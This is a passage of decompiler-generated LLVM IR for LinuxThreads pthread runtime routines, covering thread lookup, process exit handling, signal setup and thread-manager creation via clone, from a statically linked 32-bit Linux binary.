  br label %dec_label_pc_80580af

dec_label_pc_80580ac:                             ; preds = %dec_label_pc_80580b6, %dec_label_pc_80580af
  %v1_80580ac = add i32 %v0_80580ac, 16
  br label %dec_label_pc_80580af

dec_label_pc_80580af:                             ; preds = %entry, %dec_label_pc_80580ac
  %v0_80580ac = phi i32 [ ptrtoint (i32* @global_var_806f8c0.697 to i32), %entry ], [ %v1_80580ac, %dec_label_pc_80580ac ]
  store i32 %v0_80580ac, i32* @edx, align 4
  %v1_80580af = add i32 %v0_80580ac, 8
  %v2_80580af = inttoptr i32 %v1_80580af to i32*
  %v3_80580af = load i32, i32* %v2_80580af, align 4
  %v6_80580b4 = icmp ugt i32 %v1_80580a3, %v3_80580af
  br i1 %v6_80580b4, label %dec_label_pc_80580ac, label %dec_label_pc_80580b6

dec_label_pc_80580b6:                             ; preds = %dec_label_pc_80580af
  %v2_80580b6 = add i32 %v0_80580ac, 12
  %v3_80580b6 = inttoptr i32 %v2_80580b6 to i32*
  %v4_80580b6 = load i32, i32* %v3_80580b6, align 4
  %v10_80580b6 = icmp ult i32 %v1_80580a3, %v4_80580b6
  br i1 %v10_80580b6, label %dec_label_pc_80580ac, label %dec_label_pc_80580bb

dec_label_pc_80580bb:                             ; preds = %dec_label_pc_80580b6
  ret i32 %v3_80580af

; uselistorder directives
  uselistorder i32 %v0_80580ac, { 1, 2, 3, 0 }
  uselistorder i32 %v1_80580a3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80580af, { 1, 0 }
}

define i32 @thread_self.11(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80580c3 = load i32, i32* @esp, align 4
  %v1_80580c3 = load i32, i32* @global_var_807a620.650, align 32
  %v7_80580c3 = icmp ult i32 %v0_80580c3, %v1_80580c3
  %v1_80580c9 = icmp eq i1 %v7_80580c3, false
  br i1 %v1_80580c9, label %dec_label_pc_80580fa, label %dec_label_pc_80580cb

dec_label_pc_80580cb:                             ; preds = %entry
  %v1_80580cb = load i32, i32* @global_var_807a624.651, align 4
  %v7_80580cb = icmp ult i32 %v0_80580c3, %v1_80580cb
  br i1 %v7_80580cb, label %dec_label_pc_80580e0, label %dec_label_pc_80580d3

dec_label_pc_80580d3:                             ; preds = %dec_label_pc_80580cb
  %v1_80580d8 = load i32, i32* @global_var_807a628.653, align 8
  %v7_80580d8 = icmp ult i32 %v0_80580c3, %v1_80580d8
  br i1 %v7_80580d8, label %dec_label_pc_80580fa, label %dec_label_pc_80580e0

dec_label_pc_80580e0:                             ; preds = %dec_label_pc_80580d3, %dec_label_pc_80580cb
  %v0_80580e0 = load i32, i32* @global_var_807e100.654, align 256
  %v1_80580e0 = icmp eq i32 %v0_80580e0, 0
  br i1 %v1_80580e0, label %dec_label_pc_80580ee, label %dec_label_pc_80580e9

dec_label_pc_80580e9:                             ; preds = %dec_label_pc_80580e0
  %v0_80580e9 = call i32 @__pthread_find_self()
  br label %dec_label_pc_80580ee

dec_label_pc_80580ee:                             ; preds = %dec_label_pc_80580e0, %dec_label_pc_80580e9
  %v2_80580f4 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_80580fa

dec_label_pc_80580fa:                             ; preds = %dec_label_pc_80580d3, %entry, %dec_label_pc_80580ee
  %v0_80580fa = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_80580d3 ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_80580f4, %dec_label_pc_80580ee ]
  ret i32 %v0_80580fa

; uselistorder directives
  uselistorder label %dec_label_pc_80580fa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80580ee, { 1, 0 }
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %v0_80580fb = load i32, i32* @ebx, align 4
  %v0_8058102 = load i32, i32* @global_var_8073c84.658, align 4
  %v2_8058102 = icmp slt i32 %v0_8058102, 0
  br i1 %v2_8058102, label %entry.dec_label_pc_8058188_crit_edge, label %dec_label_pc_805810b

entry.dec_label_pc_8058188_crit_edge:             ; preds = %entry
  %v0_805818f.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8058188

dec_label_pc_805810b:                             ; preds = %entry
  %v1_805810b = call i32 @thread_self.11(i32 %v0_80580fb)
  store i32 %v1_805810b, i32* @ebx, align 4
  store i32 %v1_805810b, i32* %stack_var_-152, align 4
  %v2_8058129 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_8058129

dec_label_pc_8058129:                             ; preds = %dec_label_pc_8058145, %dec_label_pc_805810b
  %v0_8058134 = load i32, i32* @global_var_8073c84.658, align 4
  store i32 %v0_8058134, i32* %stack_var_-188, align 4
  %v3_805813a = call i32 @__libc_write(i32 %v0_8058134, i32 %v2_8058129, i32 148)
  %v8_8058142 = icmp eq i32 %v3_805813a, -1
  %v1_8058143 = icmp eq i1 %v8_8058142, false
  br i1 %v1_8058143, label %dec_label_pc_805814f, label %dec_label_pc_8058145

dec_label_pc_8058145:                             ; preds = %dec_label_pc_8058129
  %v0_8058145 = load i32, i32* %stack_var_-188, align 4
  %v1_8058145 = call i32 @__errno_location(i32 %v0_8058145)
  %v1_805814a = inttoptr i32 %v1_8058145 to i32*
  %v2_805814a = load i32, i32* %v1_805814a, align 4
  %v11_805814a = icmp eq i32 %v2_805814a, 4
  br i1 %v11_805814a, label %dec_label_pc_8058129, label %dec_label_pc_805814f

dec_label_pc_805814f:                             ; preds = %dec_label_pc_8058145, %dec_label_pc_8058129
  %v0_805814f = load i32, i32* @ebx, align 4
  store i32 %v0_805814f, i32* @eax, align 4
  %v0_8058151 = call i32 @suspend.10()
  %v0_8058156 = load i32, i32* @ebx, align 4
  %v1_8058156 = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  %v12_8058156 = icmp eq i32 %v0_8058156, %v1_8058156
  %v1_805815c = icmp eq i1 %v12_8058156, false
  br i1 %v1_805815c, label %dec_label_pc_805814f.dec_label_pc_8058188_crit_edge, label %dec_label_pc_805815e

dec_label_pc_805814f.dec_label_pc_8058188_crit_edge: ; preds = %dec_label_pc_805814f
  br label %dec_label_pc_8058188

dec_label_pc_805815e:                             ; preds = %dec_label_pc_805814f
  %v0_8058166 = load i32, i32* @global_var_8073ab4.661, align 4
  store i32 %v0_8058166, i32* %stack_var_-188, align 4
  %v4_805816c = call i32 @waitpid(i32 %v0_8058166, i32 0, i32 -2147483648, i32 %v0_8058151)
  store i32 0, i32* @global_var_807a628.653, align 8
  store i32 0, i32* @global_var_807a624.651, align 4
  br label %dec_label_pc_8058188

dec_label_pc_8058188:                             ; preds = %entry.dec_label_pc_8058188_crit_edge, %dec_label_pc_805814f.dec_label_pc_8058188_crit_edge, %dec_label_pc_805815e
  %v0_805818f = phi i32 [ %v0_8058151, %dec_label_pc_805814f.dec_label_pc_8058188_crit_edge ], [ %v0_805818f.pre, %entry.dec_label_pc_8058188_crit_edge ], [ %v4_805816c, %dec_label_pc_805815e ]
  store i32 %v0_80580fb, i32* @ebx, align 4
  ret i32 %v0_805818f

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058188, { 2, 1, 0 }
}

define i32 @__GI_pthread_self(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8058190 = call i32 @thread_self.11(i32 ptrtoint (i32* @0 to i32))
  %v1_8058195 = add i32 %v1_8058190, 16
  %v2_8058195 = inttoptr i32 %v1_8058195 to i32*
  %v3_8058195 = load i32, i32* %v2_8058195, align 4
  ret i32 %v3_8058195
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8058199 = load i32, i32* @ebx, align 4
  store i32 %v0_8058199, i32* %stack_var_-4, align 4
  %v1_805819d = call i32 @thread_self.11(i32 %v0_8058199)
  %v0_80581a2 = load i32, i32* @global_var_8073c84.658, align 4
  %v10_80581a2 = icmp eq i32 %v0_80581a2, -1
  store i32 %v1_805819d, i32* @ebx, align 4
  br i1 %v10_80581a2, label %dec_label_pc_80581fe, label %dec_label_pc_80581ad

dec_label_pc_80581ad:                             ; preds = %entry
  %v0_80581b0 = load i32, i32* @global_var_807a624.651, align 4
  %v1_80581b6 = call i32 @free(i32 %v0_80581b0)
  %v0_80581bc = load i32, i32* @global_var_8073c84.658, align 4
  store i32 0, i32* @global_var_807a628.653, align 8
  store i32 0, i32* @global_var_807a624.651, align 4
  %v1_80581d6 = call i32 @__libc_close(i32 %v0_80581bc)
  %v0_80581dc = load i32, i32* @global_var_807e118.698, align 8
  %v1_80581e2 = call i32 @__libc_close(i32 %v0_80581dc)
  store i32 -1, i32* @global_var_807e118.698, align 8
  store i32 -1, i32* @global_var_8073c84.658, align 4
  br label %dec_label_pc_80581fe

dec_label_pc_80581fe:                             ; preds = %entry, %dec_label_pc_80581ad
  %v0_80581fe = phi i32 [ %tmp3, %entry ], [ %v0_80581dc, %dec_label_pc_80581ad ]
  %v1_80581fe = call i32 @__libc_getpid(i32 %v0_80581fe)
  %v1_8058203 = load i32, i32* @ebx, align 4
  %v2_8058203 = add i32 %v1_8058203, 20
  %v3_8058203 = inttoptr i32 %v2_8058203 to i32*
  store i32 %v1_80581fe, i32* %v3_8058203, align 4
  %v0_8058206 = load i32, i32* @ebx, align 4
  store i32 %v0_8058206, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  %v2_805820c = inttoptr i32 %v0_8058206 to i32*
  store i32 %v0_8058206, i32* %v2_805820c, align 4
  %v0_805820e = load i32, i32* @ebx, align 4
  %v2_805820e = add i32 %v0_805820e, 4
  %v3_805820e = inttoptr i32 %v2_805820e to i32*
  store i32 %v0_805820e, i32* %v3_805820e, align 4
  %v0_8058211 = load i32, i32* @ebx, align 4
  %v1_8058211 = add i32 %v0_8058211, 68
  %v2_8058211 = inttoptr i32 %v1_8058211 to i32*
  store i32 ptrtoint (i32* @global_var_807a664.699 to i32), i32* %v2_8058211, align 4
  %v0_8058218 = load i32, i32* @ebx, align 4
  %v1_8058218 = add i32 %v0_8058218, 76
  %v2_8058218 = inttoptr i32 %v1_8058218 to i32*
  store i32 ptrtoint (i32* @global_var_807a668.700 to i32), i32* %v2_8058218, align 4
  %v2_8058221 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058221, i32* @ebx, align 4
  ret i32 %v1_80581fe

; uselistorder directives
  uselistorder i32 %v0_805820e, { 1, 0 }
  uselistorder i32 %v0_8058206, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80581fe, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v2_805822e = call i32 @pthread_onexit_process(i32 0, i32 0)
  %v0_8058233 = call i32 @__pthread_reset_main_thread()
  %v2_8058239 = ptrtoint i32* %stack_var_-140 to i32
  %v2_805823d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805823d, i32* @ebx, align 4
  %v1_8058242 = call i32 @sigemptyset(i32 %v2_8058239)
  store i32 0, i32* %stack_var_-144, align 4
  %v0_8058260 = load i32, i32* @global_var_8073c88.687, align 8
  %v4_8058266 = call i32 @__libc_sigaction(i32 %v0_8058260, i32* nonnull %stack_var_-144, i32 0)
  %v0_8058271 = load i32, i32* @global_var_8073c8c.671, align 4
  %v4_8058277 = call i32 @__libc_sigaction(i32 %v0_8058271, i32* nonnull %stack_var_-144, i32 0)
  %v0_805827c = load i32, i32* @global_var_8073c90.665, align 16
  %tmp12 = icmp slt i32 %v0_805827c, 1
  br i1 %tmp12, label %dec_label_pc_8058295, label %dec_label_pc_8058288

dec_label_pc_8058288:                             ; preds = %entry
  %v4_805828d = call i32 @__libc_sigaction(i32 %v0_805827c, i32* nonnull %stack_var_-144, i32 0)
  br label %dec_label_pc_8058295

dec_label_pc_8058295:                             ; preds = %entry, %dec_label_pc_8058288
  %v0_805829c = phi i32 [ %v0_805827c, %entry ], [ %v4_805828d, %dec_label_pc_8058288 ]
  ret i32 %v0_805829c

; uselistorder directives
  uselistorder i32 %v0_805827c, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %dec_label_pc_8058295, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-6291456 = alloca i32, align 4
  %v0_805829d = load i32, i32* @esi, align 4
  %v0_805829e = load i32, i32* @ebx, align 4
  %v0_80582a5 = load i32, i32* @global_var_807a620.650, align 32
  %v1_80582a5 = icmp eq i32 %v0_80582a5, 0
  %v1_80582ac = icmp eq i1 %v1_80582a5, false
  br i1 %v1_80582ac, label %dec_label_pc_8058437, label %dec_label_pc_80582b2

dec_label_pc_80582b2:                             ; preds = %entry
  %v4_80582b9 = ptrtoint i32* %stack_var_-6291456 to i32
  store i32 %v4_80582b9, i32* %eax.global-to-local, align 4
  store i32 %v4_80582b9, i32* @global_var_807a620.650, align 32
  %v1_80582c3 = call i32 @__libc_getpid(i32 %v0_805829e)
  store i32 %v1_80582c3, i32* @global_var_80738d4.701, align 4
  %v0_80582cd = load i32, i32* bitcast (i32** @global_var_8073d7c.702 to i32*), align 4
  store i32 %v0_80582cd, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807a664.699 to i32), i32* bitcast (i32** @global_var_8073904.703 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_807a668.700 to i32), i32* bitcast (i32** @global_var_807390c.704 to i32*), align 4
  store i32 0, i32* @global_var_8073db0.705, align 16
  %v1_80583024 = icmp eq i32 %v0_80582cd, 0
  %v1_805830411 = icmp eq i1 %v1_80583024, false
  br i1 %v1_805830411, label %dec_label_pc_80582f2, label %dec_label_pc_8058306

dec_label_pc_80582f2:                             ; preds = %dec_label_pc_80582b2, %dec_label_pc_80582ff
  %v0_80582f8 = phi i32 [ %v3_80582ff, %dec_label_pc_80582ff ], [ %v0_80582cd, %dec_label_pc_80582b2 ]
  %v1_80582f2 = add i32 %v0_80582f8, 52
  %v2_80582f2 = inttoptr i32 %v1_80582f2 to i32*
  %v3_80582f2 = load i32, i32* %v2_80582f2, align 4
  %v12_80582f2 = icmp eq i32 %v3_80582f2, 1
  br i1 %v12_80582f2, label %dec_label_pc_80582ff, label %dec_label_pc_80582f8

dec_label_pc_80582f8:                             ; preds = %dec_label_pc_80582f2
  store i32 0, i32* %v2_80582f2, align 4
  %v0_80582ff.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80582ff

dec_label_pc_80582ff:                             ; preds = %dec_label_pc_80582f2, %dec_label_pc_80582f8
  %v0_80582ff = phi i32 [ %v0_80582f8, %dec_label_pc_80582f2 ], [ %v0_80582ff.pre, %dec_label_pc_80582f8 ]
  %v1_80582ff = add i32 %v0_80582ff, 32
  %v2_80582ff = inttoptr i32 %v1_80582ff to i32*
  %v3_80582ff = load i32, i32* %v2_80582ff, align 4
  store i32 %v3_80582ff, i32* %eax.global-to-local, align 4
  %v1_8058302 = icmp eq i32 %v3_80582ff, 0
  %v1_8058304 = icmp eq i1 %v1_8058302, false
  br i1 %v1_8058304, label %dec_label_pc_80582f2, label %dec_label_pc_8058302.dec_label_pc_8058306_crit_edge

dec_label_pc_8058302.dec_label_pc_8058306_crit_edge: ; preds = %dec_label_pc_80582ff
  br label %dec_label_pc_8058306

dec_label_pc_8058306:                             ; preds = %dec_label_pc_8058302.dec_label_pc_8058306_crit_edge, %dec_label_pc_80582b2
  %v2_8058308 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8058308, i32* @ebx, align 4
  %v2_8058312 = call i32 @getrlimit(i32 3, i32 %v2_8058308)
  store i32 %v2_8058312, i32* %eax.global-to-local, align 4
  %v1_8058317 = call i32 @__GI_getpagesize(i32 3)
  %v2_8058321 = mul i32 %v1_8058317, 2
  store i32 %v2_8058321, i32* %eax.global-to-local, align 4
  %v2_8058326 = sub i32 2097152, %v2_8058321
  %v3_8058328 = load i32, i32* %stack_var_-16, align 4
  %tmp = icmp ugt i32 %v3_8058328, %v2_8058326
  br i1 %tmp, label %dec_label_pc_8058331, label %dec_label_pc_8058345

dec_label_pc_8058331:                             ; preds = %dec_label_pc_8058306
  store i32 %v2_8058326, i32* %stack_var_-16, align 4
  %v6_805833d = bitcast i32* %stack_var_-16 to %rlimit*
  %v7_805833d = call i32 @__GI_setrlimit(i32 3, %rlimit* %v6_805833d, i32 %v2_8058321, i32 %v2_8058321)
  store i32 %v7_805833d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058345

dec_label_pc_8058345:                             ; preds = %dec_label_pc_8058306, %dec_label_pc_8058331
  store i32 134580111, i32* %stack_var_-284, align 4
  %v2_8058350 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8058350, i32* @ebx, align 4
  %v2_8058354 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_8058354, i32* @esi, align 4
  %v1_8058359 = call i32 @sigemptyset(i32 %v2_8058350)
  store i32 %v1_8058359, i32* %eax.global-to-local, align 4
  %v0_805836f = load i32, i32* @global_var_8073c88.687, align 8
  %v5_8058375 = call i32 @__libc_sigaction(i32 %v0_805836f, i32* nonnull %stack_var_-284, i32 0)
  store i32 134579966, i32* %stack_var_-284, align 4
  store i32 %v2_8058354, i32* %eax.global-to-local, align 4
  %v0_8058384 = load i32, i32* @global_var_8073c88.687, align 8
  %v2_805838b = call i32 @__GI_sigaddset(i32 %v2_8058350, i32 %v0_8058384)
  store i32 %v2_805838b, i32* %eax.global-to-local, align 4
  %v0_8058396 = load i32, i32* @global_var_8073c8c.671, align 4
  %v5_805839c = call i32 @__libc_sigaction(i32 %v0_8058396, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_805839c, i32* %eax.global-to-local, align 4
  %v0_80583a4 = load i32, i32* @global_var_8073c90.665, align 16
  %tmp34 = icmp slt i32 %v0_80583a4, 1
  br i1 %tmp34, label %dec_label_pc_80583d2, label %dec_label_pc_80583ad

dec_label_pc_80583ad:                             ; preds = %dec_label_pc_8058345
  store i32 134577911, i32* %stack_var_-284, align 4
  %v1_80583b9 = call i32 @sigemptyset(i32 %v2_8058350)
  store i32 %v1_80583b9, i32* %eax.global-to-local, align 4
  %v0_80583c4 = load i32, i32* @global_var_8073c90.665, align 16
  %v5_80583ca = call i32 @__libc_sigaction(i32 %v0_80583c4, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_80583ca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80583d2

dec_label_pc_80583d2:                             ; preds = %dec_label_pc_8058345, %dec_label_pc_80583ad
  %v2_80583d5 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80583d5, i32* @ebx, align 4
  %v1_80583dd = call i32 @sigemptyset(i32 %v2_80583d5)
  store i32 %v2_80583d5, i32* %eax.global-to-local, align 4
  %v0_80583e4 = load i32, i32* @global_var_8073c88.687, align 8
  %v2_80583eb = call i32 @__GI_sigaddset(i32 %v2_80583d5, i32 %v0_80583e4)
  store i32 %v2_80583eb, i32* %eax.global-to-local, align 4
  %v4_80583f8 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v5_80583f8 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v4_80583f8, i32 0)
  store i32 %v5_80583f8, i32* %eax.global-to-local, align 4
  store i32 %v2_80583d5, i32* @esi, align 4
  %v1_8058406 = call i32 @__GI_sigdelset(i32 %v2_80583d5)
  store i32 %v2_80583d5, i32* %eax.global-to-local, align 4
  %v0_805840d = load i32, i32* @global_var_8073c8c.671, align 4
  %v2_8058414 = call i32 @__GI_sigaddset(i32 %v2_80583d5, i32 %v0_805840d)
  store i32 %v2_8058414, i32* %eax.global-to-local, align 4
  %v5_8058421 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_80583f8, i32 0)
  store i32 %v5_8058421, i32* %eax.global-to-local, align 4
  store i32 1, i32* @ebx, align 4
  store i32 %v2_80583d5, i32* @esi, align 4
  %v2_805842f = call i32 @on_exit(i32 134578427, i32 0)
  store i32 %v2_805842f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058437

dec_label_pc_8058437:                             ; preds = %entry, %dec_label_pc_80583d2
  %.0 = phi i32 [ undef, %entry ], [ %v2_805842f, %dec_label_pc_80583d2 ]
  store i32 %v0_805829e, i32* @ebx, align 4
  store i32 %v0_805829d, i32* @esi, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_80583d5, { 2, 4, 1, 5, 3, 6, 0, 7, 8 }
  uselistorder i32 %v2_8058326, { 1, 0 }
  uselistorder i32 %v2_8058321, { 3, 2, 1, 0 }
  uselistorder i32 %v3_80582ff, { 1, 2, 0 }
  uselistorder i32* %stack_var_-284, { 0, 3, 1, 4, 2, 6, 5 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0, 3, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 (i32)* @sigemptyset, { 2, 1, 0, 5, 3, 4 }
  uselistorder i32* @global_var_807a664.699, { 1, 0 }
  uselistorder label %dec_label_pc_8058437, { 1, 0 }
  uselistorder label %dec_label_pc_80583d2, { 1, 0 }
  uselistorder label %dec_label_pc_8058345, { 1, 0 }
  uselistorder label %dec_label_pc_80582ff, { 1, 0 }
  uselistorder label %dec_label_pc_80582f2, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_8058440 = load i32, i32* @ebx, align 4
  %v0_8058447 = load i32, i32* @global_var_807a634.706, align 4
  %v1_805844c = inttoptr i32 %v0_8058447 to i32*
  store i32 1, i32* %v1_805844c, align 4
  %v0_8058452 = load i32, i32* @global_var_807a620.650, align 32
  %v1_8058452 = icmp eq i32 %v0_8058452, 0
  %v1_8058459 = icmp eq i1 %v1_8058452, false
  br i1 %v1_8058459, label %dec_label_pc_8058460, label %dec_label_pc_805845b

dec_label_pc_805845b:                             ; preds = %entry
  %v1_805845b = call i32 @pthread_initialize(i32 %v0_8058440)
  br label %dec_label_pc_8058460

dec_label_pc_8058460:                             ; preds = %entry, %dec_label_pc_805845b
  %v0_8058460 = load i32, i32* @global_var_807c8d0.673, align 16
  %factor = mul i32 %v0_8058460, 2
  %v3_8058468 = add i32 %factor, -32
  store i32 %v3_8058468, i32* %stack_var_-188, align 4
  %v1_805846d = call i32 @malloc(i32 %v3_8058468)
  store i32 %v1_805846d, i32* @global_var_807a624.651, align 4
  %v1_805847f = icmp eq i32 %v1_805846d, 0
  br i1 %v1_805847f, label %dec_label_pc_805863d, label %dec_label_pc_8058487

dec_label_pc_8058487:                             ; preds = %dec_label_pc_8058460
  %v0_8058487 = load i32, i32* @global_var_807c8d0.673, align 16
  %v2_805848f = mul i32 %v0_8058487, 2
  %v3_805848f = add i32 %v1_805846d, -32
  %v4_805848f = add i32 %v3_805848f, %v2_805848f
  store i32 %v4_805848f, i32* @global_var_807a628.653, align 8
  %v2_8058498 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8058498, i32* %stack_var_-188, align 4
  %v1_80584a0 = call i32 @__GI_pipe(i32 %v2_8058498)
  %v8_80584a8 = icmp eq i32 %v1_80584a0, -1
  %v1_80584a9 = icmp eq i1 %v8_80584a8, false
  br i1 %v1_80584a9, label %dec_label_pc_80584be, label %dec_label_pc_80584ab

dec_label_pc_80584ab:                             ; preds = %dec_label_pc_8058487
  %v0_80584ae = load i32, i32* @global_var_807a624.651, align 4
  store i32 %v0_80584ae, i32* %stack_var_-188, align 4
  %v1_80584b4 = call i32 @free(i32 %v0_80584ae)
  br label %dec_label_pc_80585af

dec_label_pc_80584be:                             ; preds = %dec_label_pc_8058487
  %v0_80584be = load i32, i32* @global_var_807e114.707, align 4
  %v1_80584c3 = icmp eq i32 %v0_80584be, 0
  br i1 %v1_80584c3, label %dec_label_pc_80584cc, label %dec_label_pc_80584cc.thread

dec_label_pc_80584cc.thread:                      ; preds = %dec_label_pc_80584be
  store i32 %v0_80584be, i32* @global_var_8073a5c.708, align 4
  br label %dec_label_pc_80584d9

dec_label_pc_80584cc:                             ; preds = %dec_label_pc_80584be
  %v0_80584cc.pre = load i32, i32* @global_var_8073a5c.708, align 4
  %v1_80584cc = icmp eq i32 %v0_80584cc.pre, 0
  br i1 %v1_80584cc, label %dec_label_pc_8058561, label %dec_label_pc_80584d9

dec_label_pc_80584d9:                             ; preds = %dec_label_pc_80584cc.thread, %dec_label_pc_80584cc
  %v0_80584d9 = load i32, i32* @global_var_807e104.655, align 4
  %v0_80584de = load i8, i8* @global_var_8073a60.709, align 32
  %v1_80584de = zext i8 %v0_80584de to i32
  %v4_80584de = or i32 %v1_80584de, %v0_80584d9
  %v3_80584e4 = trunc i32 %v4_80584de to i8
  %v5_80584e4 = icmp slt i8 %v3_80584e4, 0
  %v1_80584e6 = icmp eq i1 %v5_80584e4, false
  br i1 %v1_80584e6, label %dec_label_pc_8058561, label %dec_label_pc_80584e8

dec_label_pc_80584e8:                             ; preds = %dec_label_pc_80584d9
  store i32 0, i32* @edx, align 4
  %v0_80584ea = load i32, i32* bitcast (i32** @global_var_8073abc.678 to i32*), align 4
  store i32 %v0_80584ea, i32* @eax, align 4
  %v0_80584ef = load i32, i32* %stack_var_-188, align 4
  %v1_80584ef = call i32 @__pthread_lock(i32 %v0_80584ef)
  %v3_80584f4 = load i32, i32* %stack_var_-12, align 4
  %v0_8058500 = load i32, i32* @global_var_807a628.653, align 8
  store i32 134571454, i32* %stack_var_-188, align 4
  %v4_805850b = call i32 @clone(i32 134571454, i32 %v0_8058500, i32 3840, i32 %v3_80584f4)
  store i32 %v4_805850b, i32* @eax, align 4
  store i32 %v4_805850b, i32* @ebx, align 4
  %v10_8058515 = icmp eq i32 %v4_805850b, -1
  br i1 %v10_8058515, label %dec_label_pc_805854c, label %dec_label_pc_805851a

dec_label_pc_805851a:                             ; preds = %dec_label_pc_80584e8
  store i32 ptrtoint (i32* @global_var_8073aa0.652 to i32), i32* @global_var_8073c4c.710, align 4
  store i32 8, i32* @global_var_8073c48.711, align 8
  store i32 ptrtoint (i32* @global_var_8073aa0.652 to i32), i32* @global_var_807e10c.656, align 4
  store i32 2049, i32* @global_var_8073ab0.712, align 16
  store i32 %v4_805850b, i32* @global_var_8073ab4.661, align 4
  %v0_8058547 = call i32 @__linuxthreads_create_event()
  br label %dec_label_pc_805854c

dec_label_pc_805854c:                             ; preds = %dec_label_pc_80584e8, %dec_label_pc_805851a
  %v0_805854f = load i32, i32* bitcast (i32** @global_var_8073abc.678 to i32*), align 4
  store i32 %v0_805854f, i32* %stack_var_-188, align 4
  %v1_8058555 = inttoptr i32 %v0_805854f to i32*
  %v2_8058555 = call i32 @__pthread_unlock(i32* %v1_8058555)
  %v0_805855d = load i32, i32* @ebx, align 4
  %v1_805855d = icmp eq i32 %v0_805855d, 0
  %v1_805855f = icmp eq i1 %v1_805855d, false
  br i1 %v1_805855f, label %dec_label_pc_8058582, label %dec_label_pc_8058561

dec_label_pc_8058561:                             ; preds = %dec_label_pc_805854c, %dec_label_pc_80584d9, %dec_label_pc_80584cc
  %v3_8058561 = load i32, i32* %stack_var_-12, align 4
  %v0_805856d = load i32, i32* @global_var_807a628.653, align 8
  store i32 134569821, i32* %stack_var_-188, align 4
  %v4_8058578 = call i32 @clone(i32 134569821, i32 %v0_805856d, i32 3840, i32 %v3_8058561)
  store i32 %v4_8058578, i32* @ebx, align 4
  br label %dec_label_pc_8058582

dec_label_pc_8058582:                             ; preds = %dec_label_pc_805854c, %dec_label_pc_8058561
  %v0_80585e1 = phi i32 [ %v0_805855d, %dec_label_pc_805854c ], [ %v4_8058578, %dec_label_pc_8058561 ]
  %v10_8058582 = icmp eq i32 %v0_80585e1, -1
  %v1_8058585 = icmp eq i1 %v10_8058582, false
  br i1 %v1_8058585, label %dec_label_pc_80585ba, label %dec_label_pc_8058587

dec_label_pc_8058587:                             ; preds = %dec_label_pc_8058582
  %v0_805858a = load i32, i32* @global_var_807a624.651, align 4
  store i32 %v0_805858a, i32* %stack_var_-188, align 4
  %v1_8058590 = call i32 @free(i32 %v0_805858a)
  store i32 %v0_805858a, i32* @ebx, align 4
  %v3_8058596 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_8058596, i32* %stack_var_-188, align 4
  %v1_805859d = call i32 @__libc_close(i32 %v3_8058596)
  store i32 %v3_8058596, i32* @ecx, align 4
  store i32 %tmp8, i32* %stack_var_-188, align 4
  %v1_80585aa = call i32 @__libc_close(i32 %tmp8)
  br label %dec_label_pc_80585af

dec_label_pc_80585af:                             ; preds = %dec_label_pc_80584ab, %dec_label_pc_8058587
  br label %dec_label_pc_805863d

dec_label_pc_80585ba:                             ; preds = %dec_label_pc_8058582
  store i32 2049, i32* @global_var_8073ab0.712, align 16
